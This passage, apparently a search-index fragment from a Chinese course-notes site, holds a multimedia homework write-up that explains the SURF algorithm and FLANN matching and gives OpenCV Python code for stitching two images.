\u5728\u6c42Hessian\u77e9\u9635\u65f6\uff0c\u8981\u5148\u9ad8\u65af\u5e73\u6ed1\u7136\u540e\u6c42\u4e8c\u9636\u5bfc\u6570\uff0c\u8fd9\u5728\u79bb\u6563\u7684\u50cf\u7d20\u70b9\u662f\u7528\u6a21\u677f\u5377\u79ef\u5f62\u6210\u7684\uff0c\u8fd9\u4e24\u79cd\u64cd\u4f5c\u5408\u5728\u4e00\u8d77\u7528\u4e00\u4e2a\u6a21\u677f\u4ee3\u66ff\u5c31\u53ef\u4ee5\u4e86 \u6784\u9020\u9ad8\u65af\u91d1\u5b57\u5854 \u5728sift\u7b97\u6cd5\u4e2d\uff0c\u6bcf\u4e00\u7ec4\uff08octave\uff09\u7684\u56fe\u50cf\u5927\u5c0f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u4e0b\u4e00\u7ec4\u662f\u4e0a\u4e00\u7ec4\u56fe\u50cf\u7684\u964d\u91c7\u6837\uff08\u00bc\u5927\u5c0f\uff09\uff1b\u5728\u6bcf\u4e00\u7ec4\u91cc\u9762\u7684\u51e0\u5e45\u56fe\u50cf\u4e2d\uff0c\u4ed6\u4eec\u7684\u5927\u5c0f\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u7684\u662f\u4ed6\u4eec\u91c7\u7528\u7684\u5c3a\u5ea6\u03c3\u4e0d\u540c\u3002\u800c\u4e14\u5728\u6a21\u7cca\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ed6\u4eec\u7684\u9ad8\u65af\u6a21\u677f\u5927\u5c0f\u603b\u662f\u4e0d\u53d8\u7684\uff0c\u53ea\u662f\u5c3a\u5ea6\u03c3\u6539\u53d8\u3002\u5bf9\u4e8esurf\u7b97\u6cd5\uff0c\u56fe\u50cf\u7684\u5927\u5c0f\u603b\u662f\u4e0d\u53d8\u7684\uff0c\u6539\u53d8\u7684\u53ea\u662f\u5c3a\u5ea6\u03c3\uff0c\u4ee5\u53ca\u9ad8\u65af\u6a21\u7cca\u6a21\u677f\u7684\u5c3a\u5bf8\u548c\u957f\u5ea6 \u5b9a\u4f4d\u7279\u5f81\u70b9 \u7ecf\u8fc7hessian\u77e9\u9635\u5904\u7406\u8fc7\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u4e0e\u51763\u7ef4\u9886\u57df\u768426\u4e2a\u70b9\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\uff0c\u5982\u679c\u5b83\u662f\u8fd926\u4e2a\u70b9\u4e2d\u7684\u6700\u5927\u503c\u6216\u8005\u6700\u5c0f\u503c\uff0c\u5219\u4fdd\u7559\u4e0b\u6765\uff0c\u5f53\u505a\u521d\u6b65\u7684\u7279\u5f81\u70b9\u3002 \u786e\u5b9a\u7279\u5f81\u70b9\u4e3b\u65b9\u5411 \u5728SURF\u4e2d\uff0c\u4e0d\u7edf\u8ba1\u5176\u68af\u5ea6\u76f4\u65b9\u56fe\uff0c\u800c\u662f\u7edf\u8ba1\u7279\u5f81\u70b9\u9886\u57df\u5185\u7684Harr\u5c0f\u6ce2\u7279\u5f81\u3002\u5373\u4ee5\u7279\u5f81\u70b9\u4e3a\u4e2d\u5fc3\uff0c\u8ba1\u7b97\u534a\u5f84\u4e3a6s(S\u4e3a\u7279\u5f81\u70b9\u6240\u5728\u7684\u5c3a\u5ea6\u503c)\u7684\u90bb\u57df\u5185\uff0c\u7edf\u8ba160\u5ea6\u6247\u5f62\u5185\u6240\u6709\u70b9\u5728x(\u6c34\u5e73)\u548cy(\u5782\u76f4)\u65b9\u5411\u7684Haar\u5c0f\u6ce2\u54cd\u5e94\u603b\u548c(Haar\u5c0f\u6ce2\u8fb9\u957f\u53d64s)\uff0c\u5e76\u7ed9\u8fd9\u4e9b\u54cd\u5e94\u503c\u8d4b\u9ad8\u65af\u6743\u91cd\u7cfb\u6570\uff0c\u4f7f\u5f97\u9760\u8fd1\u7279\u5f81\u70b9\u7684\u54cd\u5e94\u8d21\u732e\u5927\uff0c\u800c\u8fdc\u79bb\u7279\u5f81\u70b9\u7684\u54cd\u5e94\u8d21\u732e\u5c0f\uff0c\u7136\u540e60\u5ea6\u8303\u56f4\u5185\u7684\u54cd\u5e94\u76f8\u52a0\u4ee5\u5f62\u6210\u65b0\u7684\u77e2\u91cf\uff0c\u904d\u5386\u6574\u4e2a\u5706\u5f62\u533a\u57df\uff0c\u9009\u62e9\u6700\u957f\u77e2\u91cf\u7684\u65b9\u5411\u4e3a\u8be5\u7279\u5f81\u70b9\u7684\u4e3b\u65b9\u5411\u3002\u8fd9\u6837\uff0c\u901a\u8fc7\u7279\u5f81\u70b9\u9010\u4e2a\u8fdb\u884c\u8ba1\u7b97\uff0c\u5f97\u5230\u6bcf\u4e00\u4e2a\u7279\u5f81\u70b9\u7684\u4e3b\u65b9\u5411\u3002\u8be5\u8fc7\u7a0b\u7684\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u6784\u9020\u7279\u5f81\u63cf\u8ff0\u5b50 \u5728\u7279\u5f81\u70b9\u5468\u56f4\u53d6\u4e00\u4e2a\u6b63\u65b9\u5f62\u6846\uff0c\u6846\u7684\u8fb9\u957f\u4e3a20s(s\u662f\u6240\u68c0\u6d4b\u5230\u8be5\u7279\u5f81\u70b9\u6240\u5728\u7684\u5c3a\u5ea6)\u3002\u7136\u540e\u628a\u8be5\u6846\u5206\u4e3a16\u4e2a\u5b50\u533a\u57df\uff0c\u6bcf\u4e2a\u5b50\u533a\u57df\u7edf\u8ba125\u4e2a\u50cf\u7d20\u7684\u6c34\u5e73\u65b9\u5411\u548c\u5782\u76f4\u65b9\u5411\u7684haar\u5c0f\u6ce2\u7279\u5f81\uff0c opencv\u4e2d\u7684SURF\u5b9e\u73b0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 import cv2 img = cv2 . imread ( 'src1.jpg' ) surf = cv2 . xfeatures2d . SURF_create ( 5000 ) kp , des = surf . detectAndCompute ( img , None ) print ( len ( kp )) #\u6253\u5370\u51fa\u7279\u5f81\u70b9\u7684\u4e2a\u6570 \u6b64\u5904\u4e3a28\u4e2a img = cv2 . drawKeypoints ( img , kp , None , ( 255 , 0 , 0 ), 4 ) cv2 . imshow ( 'img' , img ) cv2 . waitKey () \u5982\u56fe\uff1a FLANN\u5339\u914d \u00b6 FLANN \u662f\u5feb\u901f\u6700\u8fd1\u90bb\u641c\u7d22\u5305(Fast_Library_for_Approximate_Nearest_Neighbors)\u7684\u7b80\u79f0\u3002\u5b83\u662f\u4e00\u4e2a\u5bf9\u5927\u6570\u636e\u96c6\u548c\u9ad8\u7ef4\u7279\u5f81\u8fdb\u884c\u6700\u8fd1\u90bb\u641c\u7d22\u7684\u7b97\u6cd5\u7684\u96c6\u5408,\u800c\u4e14\u8fd9\u4e9b\u7b97\u6cd5\u90fd\u5df2\u7ecf\u88ab\u4f18\u5316\u8fc7\u4e86\u3002\u5728\u9762\u5bf9\u5927\u6570\u636e\u96c6\u65f6\u5b83\u7684\u6548\u679c\u8981\u597d\u4e8e BFMatcher(\u66b4\u529b\u5339\u914d)\u3002 \u4f7f\u7528 FLANN \u5339\u914d,\u6211\u4eec\u9700\u8981\u4f20\u5165\u4e24\u4e2a\u5b57\u5178\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e24\u4e2a\u7528\u6765\u786e\u5b9a\u8981\u4f7f\u7528\u7684\u7b97\u6cd5\u548c\u5176\u4ed6\u76f8\u5173\u53c2\u6570\u7b49\u3002\u7b2c\u4e00\u4e2a\u662f IndexParams \u3002 indexparams = dict(algorithm = FLANNINDEX K DT REE, trees = 5) \u5404\u79cd\u4e0d\u540c\u7b97\u6cd5\u7684\u4fe1\u606f\u53ef\u4ee5\u5728 FLANN \u6587\u6863\u4e2d\u627e\u5230\u3002 \u7b2c\u4e8c\u4e2a\u5b57\u5178\u662f SearchParams \u3002\u7528\u5b83\u6765\u6307\u5b9a\u9012\u5f52\u904d\u5386\u7684\u6b21\u6570\u3002\u503c\u8d8a\u9ad8\u7ed3\u679c\u8d8a\u51c6\u786e, \u4f46\u662f\u6d88\u8017\u7684\u65f6\u95f4\u4e5f\u8d8a\u591a\u3002 \u5982\u679c\u4f60\u60f3\u4fee\u6539\u8fd9\u4e2a\u503c, \u4f20\u5165\u53c2\u6570: searchparams = dict(checks = 100) python \u4ee3\u7801\u5982\u4e0b 1 2 3 4 5 FLANN_INDEX_KDTREE = 0 #\u5efa\u7acbFLANN\u5339\u914d\u5668\u7684\u53c2\u6570 indexParams = dict ( algorithm = FLANN_INDEX_KDTREE , trees = 5 ) #\u914d\u7f6e\u7d22\u5f15\uff0c\u5bc6\u5ea6\u6811\u7684\u6570\u91cf\u4e3a5 searchParams = dict ( checks = 50 ) #\u6307\u5b9a\u9012\u5f52\u6b21\u6570 #FlannBasedMatcher\uff1a\u662f\u76ee\u524d\u6700\u5feb\u7684\u7279\u5f81\u5339\u914d\u7b97\u6cd5\uff08\u6700\u8fd1\u90bb\u641c\u7d22\uff09 flann = cv2 . FlannBasedMatcher ( indexParams , searchParams ) #\u5efa\u7acb\u5339\u914d\u5668 \u5904\u7406\u6b65\u9aa4 \u00b6 \u91c7\u7528surft\u7279\u5f81\u68c0\u6d4b\u7b97\u6cd5\u68c0\u6d4b\u4e24\u5e45\u56fe\u50cf\u7684\u5173\u952e\u7279\u5f81\u70b9\uff1b \u5efa\u7acbFLANN\u5339\u914d\u5668\uff0c\u91c7\u7528\uff09\u7b97\u6cd5FlannBasedMatcher\u5339\u914d\u5173\u952e\u70b9 \u4ece\u6240\u5339\u914d\u7684\u5168\u90e8\u5173\u952e\u70b9\u4e2d\u7b5b\u9009\u51fa\u4f18\u79c0\u7684\u7279\u5f81\u70b9\uff08\u57fa\u4e8e\u8ddd\u79bb\u7b5b\u9009\uff09 \u6839\u636e\u67e5\u8be2\u56fe\u50cf\u548c\u6a21\u677f\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15\u5f97\u51fa\u4eff\u5c04\u53d8\u6362\u77e9\u9635 \u83b7\u53d6\u5de6\u8fb9\u56fe\u50cf\u5230\u53f3\u8fb9\u56fe\u50cf\u7684\u6295\u5f71\u6620\u5c04\u5173\u7cfb \u900f\u89c6\u53d8\u6362\u5c06\u5de6\u56fe\u50cf\u653e\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e \u5c06\u6709\u56fe\u50cf\u62f7\u8d1d\u5230\u7279\u5b9a\u4f4d\u7f6e\u5b8c\u6210\u62fc\u63a5 \u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #coding: utf-8 import numpy as np import cv2 leftgray = cv2 . imread ( 'src2.jpg' ) rightgray = cv2 . imread ( 'src1.jpg' ) hessian = 40 surf = cv2 . xfeatures2d . SURF_create ( hessian ) #surf=cv2.SURF(hessian) #\u5c06Hessian Threshold\u8bbe\u7f6e\u4e3a400,\u9608\u503c\u8d8a\u5927\u80fd\u68c0\u6d4b\u7684\u7279\u5f81\u5c31\u8d8a\u5c11 kp1 , des1 = surf . detectAndCompute ( leftgray , None ) #\u67e5\u627e\u5173\u952e\u70b9\u548c\u63cf\u8ff0\u7b26 kp2 , des2 = surf . detectAndCompute ( rightgray , None ) FLANN_INDEX_KDTREE = 0 #\u5efa\u7acbFLANN\u5339\u914d\u5668\u7684\u53c2\u6570 indexParams = dict ( algorithm = FLANN_INDEX_KDTREE , trees = 5 ) #\u914d\u7f6e\u7d22\u5f15\uff0c\u5bc6\u5ea6\u6811\u7684\u6570\u91cf\u4e3a5 searchParams = dict ( checks = 50 ) #\u6307\u5b9a\u9012\u5f52\u6b21\u6570 #FlannBasedMatcher\uff1a\u662f\u76ee\u524d\u6700\u5feb\u7684\u7279\u5f81\u5339\u914d\u7b97\u6cd5\uff08\u6700\u8fd1\u90bb\u641c\u7d22\uff09 flann = cv2 . FlannBasedMatcher ( indexParams , searchParams ) #\u5efa\u7acb\u5339\u914d\u5668 matches = flann . knnMatch ( des1 , des2 , k = 2 ) #\u5f97\u51fa\u5339\u914d\u7684\u5173\u952e\u70b9 good = [] #\u63d0\u53d6\u4f18\u79c0\u7684\u7279\u5f81\u70b9 for m , n in matches : if m . distance < 0.7 * n . distance : #\u5982\u679c\u7b2c\u4e00\u4e2a\u90bb\u8fd1\u8ddd\u79bb\u6bd4\u7b2c\u4e8c\u4e2a\u90bb\u8fd1\u8ddd\u79bb\u76840.7\u500d\u5c0f\uff0c\u5219\u4fdd\u7559 good . append ( m ) src_pts = np . array ([ kp1 [ m . queryIdx ] . pt for m in good ]) #\u67e5\u8be2\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15 dst_pts = np . array ([ kp2 [ m . trainIdx ] . pt for m in good ]) #\u8bad\u7ec3(\u6a21\u677f)\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15 H = cv2 . findHomography ( src_pts , dst_pts ) #\u751f\u6210\u53d8\u6362\u77e9\u9635 h , w = leftgray . shape [: 2 ] h1 , w1 = rightgray . shape [: 2 ] shft = np . array ([[ 1.0 , 0 , w ],[ 0 , 1.0 , 0 ],[ 0 , 0 , 1.0 ]]) M = np . dot ( shft , H [ 0 ]) #\u83b7\u53d6\u5de6\u8fb9\u56fe\u50cf\u5230\u53f3\u8fb9\u56fe\u50cf\u7684\u6295\u5f71\u6620\u5c04\u5173\u7cfb dst_corners = cv2 . warpPerspective ( leftgray , M ,( w * 2 , h )) #\u900f\u89c6\u53d8\u6362\uff0c\u65b0\u56fe\u50cf\u53ef\u5bb9\u7eb3\u5b8c\u6574\u7684\u4e24\u5e45\u56fe # cv2.imshow('tiledImg1',dst_corners) #\u663e\u793a\uff0c\u7b2c\u4e00\u5e45\u56fe\u5df2\u5728\u6807\u51c6\u4f4d\u7f6e dst_corners [ 0 : h , w : w * 2 ] = rightgray #\u5c06\u7b2c\u4e8c\u5e45\u56fe\u653e\u5728\u53f3\u4fa7 cv2 . imwrite ( 'tiled.jpg' , dst_corners ) cv2 . imshow ( 'tiledImg' , dst_corners ) cv2 . imshow ( 'leftgray' , leftgray ) cv2 . imshow ( 'rightgray' , rightgray ) cv2 . waitKey () cv2 . destroyAllWindows () \u7ed3\u679c\u5206\u6790 \u00b6 \u539f\u6765\u7684\u56fe\u7247 \u5de6\u56fe\u53d8\u6362\u540e\u7684\u7ed3\u679c \u62fc\u63a5\u540e\u7684\u56fe\u7247 \u6297\u5e72\u6270\u5206\u6790 \u00b6 \u5de6\u56fe \u53f3\u56fe \u7ed3\u679c \u53c2\u6570\u6027\u80fd\u5206\u6790 \u00b6 hessian\u8c03\u6574\u62105000\u4e4b\u540e\uff0c\u7279\u5f81\u70b9\u5c06\u5927\u5927\u51cf\u5c11 \u82e5\u5c06\u5176\u8c03\u6574\u523040\uff0c\u7279\u5f81\u70b9\u8fc7\u591a \u53c2\u8003 \u00b6 surf\u7b97\u6cd5\u539f\u7406 \u7279\u5f81\u70b9\u68c0\u6d4b\u5b66\u4e60_2 FLANN\u5339\u914d","title":"\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_1","text":"","title":"\u6838\u5fc3\u7b97\u6cd5\u539f\u7406"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#surf","text":"SURF\u7b97\u6cd5\u662f\u5728SIFT\u7b97\u6cd5\u6539\u8fdb\u7684\u57fa\u7840\u4e0a\u63d0\u51fa\u6765\u7684\uff0c\u662f\u4e00\u4e2a\u52a0\u901f\u7248\u7684SIFT\u7b97\u6cd5\uff0cSift\u91c7\u7528\u7684\u662fDOG\u56fe\u50cf\uff0c\u800csurf\u91c7\u7528\u7684\u662fHessian\u77e9\u9635\u884c\u5217\u5f0f\u8fd1\u4f3c\u503c\u56fe\u50cf\u3002\u5373\u6bcf\u4e00\u4e2a\u50cf\u7d20\u70b9\u90fd\u53ef\u4ee5\u6c42\u51fa\u4e00\u4e2aHessian\u77e9\u9635\u3002\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u7684\u7279\u5f81\u70b9\u9700\u8981\u5177\u5907\u5c3a\u5ea6\u65e0\u5173\u6027\uff0c\u6240\u4ee5\u5728\u8fdb\u884cHessian\u77e9\u9635\u6784\u9020\u524d\uff0c\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\u3002 \u5728\u6c42Hessian\u77e9\u9635\u65f6\uff0c\u8981\u5148\u9ad8\u65af\u5e73\u6ed1\u7136\u540e\u6c42\u4e8c\u9636\u5bfc\u6570\uff0c\u8fd9\u5728\u79bb\u6563\u7684\u50cf\u7d20\u70b9\u662f\u7528\u6a21\u677f\u5377\u79ef\u5f62\u6210\u7684\uff0c\u8fd9\u4e24\u79cd\u64cd\u4f5c\u5408\u5728\u4e00\u8d77\u7528\u4e00\u4e2a\u6a21\u677f\u4ee3\u66ff\u5c31\u53ef\u4ee5\u4e86 \u6784\u9020\u9ad8\u65af\u91d1\u5b57\u5854 \u5728sift\u7b97\u6cd5\u4e2d\uff0c\u6bcf\u4e00\u7ec4\uff08octave\uff09\u7684\u56fe\u50cf\u5927\u5c0f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u4e0b\u4e00\u7ec4\u662f\u4e0a\u4e00\u7ec4\u56fe\u50cf\u7684\u964d\u91c7\u6837\uff08\u00bc\u5927\u5c0f\uff09\uff1b\u5728\u6bcf\u4e00\u7ec4\u91cc\u9762\u7684\u51e0\u5e45\u56fe\u50cf\u4e2d\uff0c\u4ed6\u4eec\u7684\u5927\u5c0f\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u7684\u662f\u4ed6\u4eec\u91c7\u7528\u7684\u5c3a\u5ea6\u03c3\u4e0d\u540c\u3002\u800c\u4e14\u5728\u6a21\u7cca\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ed6\u4eec\u7684\u9ad8\u65af\u6a21\u677f\u5927\u5c0f\u603b\u662f\u4e0d\u53d8\u7684\uff0c\u53ea\u662f\u5c3a\u5ea6\u03c3\u6539\u53d8\u3002\u5bf9\u4e8esurf\u7b97\u6cd5\uff0c\u56fe\u50cf\u7684\u5927\u5c0f\u603b\u662f\u4e0d\u53d8\u7684\uff0c\u6539\u53d8\u7684\u53ea\u662f\u5c3a\u5ea6\u03c3\uff0c\u4ee5\u53ca\u9ad8\u65af\u6a21\u7cca\u6a21\u677f\u7684\u5c3a\u5bf8\u548c\u957f\u5ea6 \u5b9a\u4f4d\u7279\u5f81\u70b9 \u7ecf\u8fc7hessian\u77e9\u9635\u5904\u7406\u8fc7\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u4e0e\u51763\u7ef4\u9886\u57df\u768426\u4e2a\u70b9\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\uff0c\u5982\u679c\u5b83\u662f\u8fd926\u4e2a\u70b9\u4e2d\u7684\u6700\u5927\u503c\u6216\u8005\u6700\u5c0f\u503c\uff0c\u5219\u4fdd\u7559\u4e0b\u6765\uff0c\u5f53\u505a\u521d\u6b65\u7684\u7279\u5f81\u70b9\u3002 \u786e\u5b9a\u7279\u5f81\u70b9\u4e3b\u65b9\u5411 \u5728SURF\u4e2d\uff0c\u4e0d\u7edf\u8ba1\u5176\u68af\u5ea6\u76f4\u65b9\u56fe\uff0c\u800c\u662f\u7edf\u8ba1\u7279\u5f81\u70b9\u9886\u57df\u5185\u7684Harr\u5c0f\u6ce2\u7279\u5f81\u3002\u5373\u4ee5\u7279\u5f81\u70b9\u4e3a\u4e2d\u5fc3\uff0c\u8ba1\u7b97\u534a\u5f84\u4e3a6s(S\u4e3a\u7279\u5f81\u70b9\u6240\u5728\u7684\u5c3a\u5ea6\u503c)\u7684\u90bb\u57df\u5185\uff0c\u7edf\u8ba160\u5ea6\u6247\u5f62\u5185\u6240\u6709\u70b9\u5728x(\u6c34\u5e73)\u548cy(\u5782\u76f4)\u65b9\u5411\u7684Haar\u5c0f\u6ce2\u54cd\u5e94\u603b\u548c(Haar\u5c0f\u6ce2\u8fb9\u957f\u53d64s)\uff0c\u5e76\u7ed9\u8fd9\u4e9b\u54cd\u5e94\u503c\u8d4b\u9ad8\u65af\u6743\u91cd\u7cfb\u6570\uff0c\u4f7f\u5f97\u9760\u8fd1\u7279\u5f81\u70b9\u7684\u54cd\u5e94\u8d21\u732e\u5927\uff0c\u800c\u8fdc\u79bb\u7279\u5f81\u70b9\u7684\u54cd\u5e94\u8d21\u732e\u5c0f\uff0c\u7136\u540e60\u5ea6\u8303\u56f4\u5185\u7684\u54cd\u5e94\u76f8\u52a0\u4ee5\u5f62\u6210\u65b0\u7684\u77e2\u91cf\uff0c\u904d\u5386\u6574\u4e2a\u5706\u5f62\u533a\u57df\uff0c\u9009\u62e9\u6700\u957f\u77e2\u91cf\u7684\u65b9\u5411\u4e3a\u8be5\u7279\u5f81\u70b9\u7684\u4e3b\u65b9\u5411\u3002\u8fd9\u6837\uff0c\u901a\u8fc7\u7279\u5f81\u70b9\u9010\u4e2a\u8fdb\u884c\u8ba1\u7b97\uff0c\u5f97\u5230\u6bcf\u4e00\u4e2a\u7279\u5f81\u70b9\u7684\u4e3b\u65b9\u5411\u3002\u8be5\u8fc7\u7a0b\u7684\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u6784\u9020\u7279\u5f81\u63cf\u8ff0\u5b50 \u5728\u7279\u5f81\u70b9\u5468\u56f4\u53d6\u4e00\u4e2a\u6b63\u65b9\u5f62\u6846\uff0c\u6846\u7684\u8fb9\u957f\u4e3a20s(s\u662f\u6240\u68c0\u6d4b\u5230\u8be5\u7279\u5f81\u70b9\u6240\u5728\u7684\u5c3a\u5ea6)\u3002\u7136\u540e\u628a\u8be5\u6846\u5206\u4e3a16\u4e2a\u5b50\u533a\u57df\uff0c\u6bcf\u4e2a\u5b50\u533a\u57df\u7edf\u8ba125\u4e2a\u50cf\u7d20\u7684\u6c34\u5e73\u65b9\u5411\u548c\u5782\u76f4\u65b9\u5411\u7684haar\u5c0f\u6ce2\u7279\u5f81\uff0c","title":"SURF\u7b97\u6cd5"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#opencvsurf","text":"1 2 3 4 5 6 7 8 9 10 11 12 import cv2 img = cv2 . imread ( 'src1.jpg' ) surf = cv2 . xfeatures2d . SURF_create ( 5000 ) kp , des = surf . detectAndCompute ( img , None ) print ( len ( kp )) #\u6253\u5370\u51fa\u7279\u5f81\u70b9\u7684\u4e2a\u6570 \u6b64\u5904\u4e3a28\u4e2a img = cv2 . drawKeypoints ( img , kp , None , ( 255 , 0 , 0 ), 4 ) cv2 . imshow ( 'img' , img ) cv2 . waitKey () \u5982\u56fe\uff1a","title":"opencv\u4e2d\u7684SURF\u5b9e\u73b0"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#flann","text":"FLANN \u662f\u5feb\u901f\u6700\u8fd1\u90bb\u641c\u7d22\u5305(Fast_Library_for_Approximate_Nearest_Neighbors)\u7684\u7b80\u79f0\u3002\u5b83\u662f\u4e00\u4e2a\u5bf9\u5927\u6570\u636e\u96c6\u548c\u9ad8\u7ef4\u7279\u5f81\u8fdb\u884c\u6700\u8fd1\u90bb\u641c\u7d22\u7684\u7b97\u6cd5\u7684\u96c6\u5408,\u800c\u4e14\u8fd9\u4e9b\u7b97\u6cd5\u90fd\u5df2\u7ecf\u88ab\u4f18\u5316\u8fc7\u4e86\u3002\u5728\u9762\u5bf9\u5927\u6570\u636e\u96c6\u65f6\u5b83\u7684\u6548\u679c\u8981\u597d\u4e8e BFMatcher(\u66b4\u529b\u5339\u914d)\u3002 \u4f7f\u7528 FLANN \u5339\u914d,\u6211\u4eec\u9700\u8981\u4f20\u5165\u4e24\u4e2a\u5b57\u5178\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e24\u4e2a\u7528\u6765\u786e\u5b9a\u8981\u4f7f\u7528\u7684\u7b97\u6cd5\u548c\u5176\u4ed6\u76f8\u5173\u53c2\u6570\u7b49\u3002\u7b2c\u4e00\u4e2a\u662f IndexParams \u3002 indexparams = dict(algorithm = FLANNINDEX K DT REE, trees = 5) \u5404\u79cd\u4e0d\u540c\u7b97\u6cd5\u7684\u4fe1\u606f\u53ef\u4ee5\u5728 FLANN \u6587\u6863\u4e2d\u627e\u5230\u3002 \u7b2c\u4e8c\u4e2a\u5b57\u5178\u662f SearchParams \u3002\u7528\u5b83\u6765\u6307\u5b9a\u9012\u5f52\u904d\u5386\u7684\u6b21\u6570\u3002\u503c\u8d8a\u9ad8\u7ed3\u679c\u8d8a\u51c6\u786e, \u4f46\u662f\u6d88\u8017\u7684\u65f6\u95f4\u4e5f\u8d8a\u591a\u3002 \u5982\u679c\u4f60\u60f3\u4fee\u6539\u8fd9\u4e2a\u503c, \u4f20\u5165\u53c2\u6570: searchparams = dict(checks = 100) python \u4ee3\u7801\u5982\u4e0b 1 2 3 4 5 FLANN_INDEX_KDTREE = 0 #\u5efa\u7acbFLANN\u5339\u914d\u5668\u7684\u53c2\u6570 indexParams = dict ( algorithm = FLANN_INDEX_KDTREE , trees = 5 ) #\u914d\u7f6e\u7d22\u5f15\uff0c\u5bc6\u5ea6\u6811\u7684\u6570\u91cf\u4e3a5 searchParams = dict ( checks = 50 ) #\u6307\u5b9a\u9012\u5f52\u6b21\u6570 #FlannBasedMatcher\uff1a\u662f\u76ee\u524d\u6700\u5feb\u7684\u7279\u5f81\u5339\u914d\u7b97\u6cd5\uff08\u6700\u8fd1\u90bb\u641c\u7d22\uff09 flann = cv2 . FlannBasedMatcher ( indexParams , searchParams ) #\u5efa\u7acb\u5339\u914d\u5668","title":"FLANN\u5339\u914d"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_2","text":"\u91c7\u7528surft\u7279\u5f81\u68c0\u6d4b\u7b97\u6cd5\u68c0\u6d4b\u4e24\u5e45\u56fe\u50cf\u7684\u5173\u952e\u7279\u5f81\u70b9\uff1b \u5efa\u7acbFLANN\u5339\u914d\u5668\uff0c\u91c7\u7528\uff09\u7b97\u6cd5FlannBasedMatcher\u5339\u914d\u5173\u952e\u70b9 \u4ece\u6240\u5339\u914d\u7684\u5168\u90e8\u5173\u952e\u70b9\u4e2d\u7b5b\u9009\u51fa\u4f18\u79c0\u7684\u7279\u5f81\u70b9\uff08\u57fa\u4e8e\u8ddd\u79bb\u7b5b\u9009\uff09 \u6839\u636e\u67e5\u8be2\u56fe\u50cf\u548c\u6a21\u677f\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15\u5f97\u51fa\u4eff\u5c04\u53d8\u6362\u77e9\u9635 \u83b7\u53d6\u5de6\u8fb9\u56fe\u50cf\u5230\u53f3\u8fb9\u56fe\u50cf\u7684\u6295\u5f71\u6620\u5c04\u5173\u7cfb \u900f\u89c6\u53d8\u6362\u5c06\u5de6\u56fe\u50cf\u653e\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e \u5c06\u6709\u56fe\u50cf\u62f7\u8d1d\u5230\u7279\u5b9a\u4f4d\u7f6e\u5b8c\u6210\u62fc\u63a5 \u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #coding: utf-8 import numpy as np import cv2 leftgray = cv2 . imread ( 'src2.jpg' ) rightgray = cv2 . imread ( 'src1.jpg' ) hessian = 40 surf = cv2 . xfeatures2d . SURF_create ( hessian ) #surf=cv2.SURF(hessian) #\u5c06Hessian Threshold\u8bbe\u7f6e\u4e3a400,\u9608\u503c\u8d8a\u5927\u80fd\u68c0\u6d4b\u7684\u7279\u5f81\u5c31\u8d8a\u5c11 kp1 , des1 = surf . detectAndCompute ( leftgray , None ) #\u67e5\u627e\u5173\u952e\u70b9\u548c\u63cf\u8ff0\u7b26 kp2 , des2 = surf . detectAndCompute ( rightgray , None ) FLANN_INDEX_KDTREE = 0 #\u5efa\u7acbFLANN\u5339\u914d\u5668\u7684\u53c2\u6570 indexParams = dict ( algorithm = FLANN_INDEX_KDTREE , trees = 5 ) #\u914d\u7f6e\u7d22\u5f15\uff0c\u5bc6\u5ea6\u6811\u7684\u6570\u91cf\u4e3a5 searchParams = dict ( checks = 50 ) #\u6307\u5b9a\u9012\u5f52\u6b21\u6570 #FlannBasedMatcher\uff1a\u662f\u76ee\u524d\u6700\u5feb\u7684\u7279\u5f81\u5339\u914d\u7b97\u6cd5\uff08\u6700\u8fd1\u90bb\u641c\u7d22\uff09 flann = cv2 . FlannBasedMatcher ( indexParams , searchParams ) #\u5efa\u7acb\u5339\u914d\u5668 matches = flann . knnMatch ( des1 , des2 , k = 2 ) #\u5f97\u51fa\u5339\u914d\u7684\u5173\u952e\u70b9 good = [] 